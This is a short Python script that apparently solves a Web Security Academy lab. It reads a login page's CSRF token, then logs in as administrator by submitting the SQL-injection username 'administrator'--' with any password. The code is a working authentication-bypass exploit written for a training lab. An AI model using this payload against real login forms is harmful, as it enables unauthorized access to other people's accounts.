import requests
from bs4 import BeautifulSoup


def main():
    url = "https://acd51f441f316575c0e10cfb00d300e1.web-security-academy.net/login"
    session = requests.session()
    resp1 = session.get(url).text
    soup = BeautifulSoup(resp1, "html.parser")
    csrf = soup.find('input', {'name': 'csrf'})['value']
    response = session.post(url, data={"username": "administrator'--", "password": "aaa", "csrf": csrf})
    if "logout" in response.text:
        print("challenge solved")
    else:
        print("something does not work, incorrect data")
        print(response.text)


if __name__ == "__main__":
    main()
